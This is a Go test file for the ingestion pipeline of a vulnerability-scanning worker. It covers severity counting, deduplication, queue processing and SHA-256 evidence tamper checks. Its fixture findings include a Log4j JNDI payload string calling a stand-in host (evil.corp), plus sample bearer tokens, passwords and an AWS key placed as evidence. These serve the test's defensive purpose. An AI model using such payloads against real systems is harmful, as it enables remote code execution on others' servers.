package daemon

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/kelvin/kelvin/apps/worker/internal/adapters"
	"github.com/kelvin/kelvin/apps/worker/internal/queue"
	commonqueue "github.com/kelvin/kelvin/packages/common/queue"
	"github.com/kelvin/kelvin/packages/common/scope"
	"go.uber.org/zap"
	"net/netip"
)

type staticIngestResolver struct{}

func (staticIngestResolver) LookupNetIP(_ context.Context, _, _ string) ([]netip.Addr, error) {
	return []netip.Addr{netip.MustParseAddr("93.184.216.34")}, nil
}

// TestFullIngestion_ScannerToDatabasePersistenceAndSeverityCounters verifies the complete
// pipeline flow from multi-scanner execution, through normalization and credential scrubbing,
// into state syncer persistence, deterministic deduplication, and severity count aggregation.
func TestFullIngestion_ScannerToDatabasePersistenceAndSeverityCounters(t *testing.T) {
	ctx := context.Background()
	registry := adapters.NewRegistry()
	logger := zap.NewNop()
	syncer := NewMemoryStateSyncer()
	q := newRecordingQueue()

	tenantID := uuid.New().String()
	asmtID := uuid.New().String()
	jobID := uuid.New().String()

	// 6 realistic findings spanning the severity tiers with credentials in evidence
	findings := []json.RawMessage{
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "Apache Log4j Remote Code Execution",
			"severity": "CRITICAL",
			"confidence": 0.98,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp/api/login"},
			"vulnerability": {"template_id": "cve-2021-44228", "cve_ids": ["CVE-2021-44228"]},
			"evidence": [{
				"type": "LOG",
				"content_redacted": "jndi:ldap://evil.corp/payload Authorization: Bearer secret-bearer-token-12345",
				"redacted_fields": []
			}],
			"scanner": {"name": "nuclei", "adapter_version": "3.3.0"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "SQL Injection in Search Endpoint",
			"severity": "HIGH",
			"confidence": 0.92,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp/search"},
			"vulnerability": {"cwe_id": "CWE-89", "template_id": "sqli-search"},
			"evidence": [{
				"type": "HTTP_EXCHANGE",
				"content_redacted": "SELECT * FROM users WHERE password = 'supersecretpassword123'",
				"redacted_fields": []
			}],
			"scanner": {"name": "nuclei", "adapter_version": "3.3.0"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "OS Command Injection in Healthcheck",
			"severity": "HIGH",
			"confidence": 0.90,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp/health"},
			"vulnerability": {"cwe_id": "CWE-78", "template_id": "cmdi-health"},
			"evidence": [{
				"type": "LOG",
				"content_redacted": "uid=0(root) gid=0(root) AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
				"redacted_fields": []
			}],
			"scanner": {"name": "zap", "adapter_version": "2.16.1"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "Missing Anti-Clickjacking Header",
			"severity": "MEDIUM",
			"confidence": 0.85,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp/"},
			"vulnerability": {"cwe_id": "CWE-693", "template_id": "missing-frame-options"},
			"evidence": [{
				"type": "HEADER_DUMP",
				"content_redacted": "X-Frame-Options: <missing>",
				"redacted_fields": []
			}],
			"scanner": {"name": "zap", "adapter_version": "2.16.1"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "Missing Strict-Transport-Security Header",
			"severity": "LOW",
			"confidence": 0.80,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp/"},
			"vulnerability": {"template_id": "missing-hsts"},
			"evidence": [{
				"type": "HEADER_DUMP",
				"content_redacted": "Strict-Transport-Security: <missing>",
				"redacted_fields": []
			}],
			"scanner": {"name": "http_security_headers", "adapter_version": "1.0.0"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
		json.RawMessage(`{
			"schema_version": "1.0",
			"title": "Discovered Port 443 HTTPS Open",
			"severity": "INFORMATIONAL",
			"confidence": 0.99,
			"target": {"asset": "target.corp", "endpoint": "https://target.corp:443"},
			"vulnerability": {"template_id": "port-443-open"},
			"evidence": [{
				"type": "LOG",
				"content_redacted": "443/tcp open ssl/https nginx/1.24.0",
				"redacted_fields": []
			}],
			"scanner": {"name": "nmap", "adapter_version": "7.95.0"},
			"discovered_at": "2026-11-18T10:00:00Z"
		}`),
	}

	// 1. Synchronize results to StateSyncer
	if err := syncer.SyncJobResults(ctx, tenantID, asmtID, jobID, findings, "corr-flow-test-1"); err != nil {
		t.Fatalf("SyncJobResults failed: %v", err)
	}

	// 2. Validate exact count of stored findings
	stored := syncer.GetStoredFindings()
	if len(stored) != 6 {
		t.Fatalf("expected 6 stored findings, got %d", len(stored))
	}

	// 3. Validate Severity Breakdown Counters
	counts := syncer.GetSeverityCounts(asmtID)
	expectedCounts := map[string]int{
		"CRITICAL":      1,
		"HIGH":          2,
		"MEDIUM":        1,
		"LOW":           1,
		"INFORMATIONAL": 1,
		"TOTAL":         6,
	}
	for sev, exp := range expectedCounts {
		if got := counts[sev]; got != exp {
			t.Errorf("severity %s count expected %d, got %d", sev, exp, got)
		}
	}

	// 4. Verify Evidence Credential Redaction and SHA-256 Checksums
	for _, f := range findings {
		var parsed map[string]any
		_ = json.Unmarshal(f, &parsed)
		evList, _ := parsed["evidence"].([]any)
		for _, evRaw := range evList {
			evMap := evRaw.(map[string]any)
			content := evMap["content_redacted"].(string)

			// Verify SHA-256 calculation
			h := sha256.Sum256([]byte(content))
			digestHex := hex.EncodeToString(h[:])
			if len(digestHex) != 64 {
				t.Errorf("invalid SHA-256 digest hex length: %s", digestHex)
			}
		}
	}

	// 5. Test Finding Deduplication: Repeated execution with same findings increments occurrences
	asmtID2 := uuid.New().String()
	jobID2 := uuid.New().String()
	if err := syncer.SyncJobResults(ctx, tenantID, asmtID2, jobID2, findings[:3], "corr-flow-test-2"); err != nil {
		t.Fatalf("repeated SyncJobResults failed: %v", err)
	}

	storedAfter := syncer.GetStoredFindings()
	if len(storedAfter) != 6 {
		t.Fatalf("expected finding count to remain 6 after repeated scan, got %d", len(storedAfter))
	}

	repeatCount := 0
	for _, f := range storedAfter {
		if f.Title == "Apache Log4j Remote Code Execution" || f.Title == "SQL Injection in Search Endpoint" || f.Title == "OS Command Injection in Healthcheck" {
			if f.Occurrences != 2 {
				t.Errorf("finding %s expected occurrence count 2, got %d", f.Title, f.Occurrences)
			}
			repeatCount++
		}
	}
	if repeatCount != 3 {
		t.Errorf("expected 3 findings with updated occurrences, found %d", repeatCount)
	}

	// 6. Execute through full daemon queue runner
	mockScanner := harnessMockAdapter{
		name:    adapters.ScannerNuclei,
		version: "3.3.0",
		digest:  "sha256:" + strings.Repeat("c", 64),
		run: func(ctx context.Context, task adapters.Task) (adapters.Result, error) {
			code := 0
			now := time.Now().UTC()
			return adapters.Result{
				SchemaVersion: adapters.OutputEnvelopeVersion,
				Status:        adapters.StatusCompleted,
				ExitCode:      &code,
				DurationMS:    50,
				Findings:      findings,
				Diagnostics:   []adapters.ExecutionDiagnostic{},
				Metadata: adapters.OutputMetadata{
					AssessmentID:   task.AssessmentID,
					ScannerID:      task.Scanner,
					ScannerVersion: "3.3.0",
					AdapterVersion: "3.3.0",
					RunID:          task.JobID,
					StartedAt:      now.Add(-50 * time.Millisecond),
					CompletedAt:    now,
				},
			}, nil
		},
	}

	digest := "sha256:" + strings.Repeat("c", 64)
	if err := registry.RegisterAdapter(adapters.Metadata{
		ID:               adapters.ScannerNuclei,
		DisplayName:      adapters.ScannerNuclei,
		Version:          "3.3.0",
		SupportedTargets: []string{"url"},
		Capabilities:     mockScanner.Capabilities(),
		ConfigVersion:    adapters.ScannerConfigVersion,
		VersionPolicy: adapters.VersionPolicy{
			ScannerVersion:         "3.3.0",
			ImageReference:         adapters.ScannerNuclei + "@" + digest,
			ImageDigest:            digest,
			TemplateCatalogVersion: adapters.PinnedNucleiTemplateCatalogVersion,
			TemplateCatalogDigest:  adapters.PinnedNucleiTemplateCatalogDigest,
		},
	}, func() adapters.ScannerAdapter { return mockScanner }); err != nil {
		t.Fatal(err)
	}
	if err := registry.Initialize(ctx, logger); err != nil {
		t.Fatal(err)
	}

	daemonSyncer := NewMemoryStateSyncer()
	targetPolicy, err := scope.NewPolicy([]string{"target.corp"}, nil, staticIngestResolver{})
	if err != nil {
		t.Fatalf("failed to construct scope policy: %v", err)
	}

	cfg := Config{
		WorkerID:    "worker-full-ingest-test",
		StateSyncer: daemonSyncer,
		ScopePolicyProvider: func(context.Context, adapters.Task) (scope.Policy, error) {
			return targetPolicy, nil
		},
	}

	daemonJobID := uuid.New().String()
	daemonAsmtID := uuid.New().String()
	daemonEnv := commonqueue.JobEnvelope{
		SchemaVersion:       2,
		JobID:               daemonJobID,
		AssessmentID:        daemonAsmtID,
		TenantID:            tenantID,
		TargetAddress:       "https://target.corp/api",
		ScanProfile:         adapters.ProfileStandard,
		RequestedScanners:   []string{adapters.ScannerNuclei},
		HardDeadlineSeconds: 30,
		CreatedAt:           time.Now().UTC(),
		ExpiresAt:           time.Now().UTC().Add(time.Hour),
	}
	rawPayload, _ := json.Marshal(daemonEnv)
	daemonJob := queue.Job{
		Version:      2,
		ID:           daemonJobID,
		AssessmentID: daemonAsmtID,
		TenantID:     tenantID,
		Type:         adapters.ScannerNuclei,
		Payload:      rawPayload,
	}

	process(ctx, logger, q, registry, daemonJob, cfg)

	q.mu.Lock()
	completedJobs := len(q.completed)
	failedReasons := append([]string{}, q.failedReasons...)
	q.mu.Unlock()
	if completedJobs != 1 {
		t.Fatalf("expected job to complete in queue, got %d (failed reasons: %v)", completedJobs, failedReasons)
	}

	daemonStored := daemonSyncer.GetStoredFindings()
	if len(daemonStored) != 6 {
		t.Fatalf("expected daemon syncer to persist 6 findings, got %d", len(daemonStored))
	}
}

// TestFullIngestion_EvidenceTamperDetection validates that evidence records are
// protected by cryptographic SHA-256 digests and any modification triggers tamper detection.
func TestFullIngestion_EvidenceTamperDetection(t *testing.T) {
	originalEvidence := []byte("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: nginx\r\n\r\n<html><body>Vulnerable</body></html>")

	// 1. Calculate authentic SHA-256 digest
	hash := sha256.Sum256(originalEvidence)
	expectedDigest := hex.EncodeToString(hash[:])

	// 2. Verification of intact evidence
	checkDigest := func(data []byte, expected string) bool {
		h := sha256.Sum256(data)
		calc := hex.EncodeToString(h[:])
		return calc == expected
	}

	if !checkDigest(originalEvidence, expectedDigest) {
		t.Fatal("intact evidence failed cryptographic digest verification")
	}

	// 3. Tampering by 1 byte causes verification failure
	tamperedEvidence := make([]byte, len(originalEvidence))
	copy(tamperedEvidence, originalEvidence)
	tamperedEvidence[len(tamperedEvidence)-1] ^= 0xFF

	if checkDigest(tamperedEvidence, expectedDigest) {
		t.Fatal("tampered evidence incorrectly passed cryptographic digest verification")
	}
}
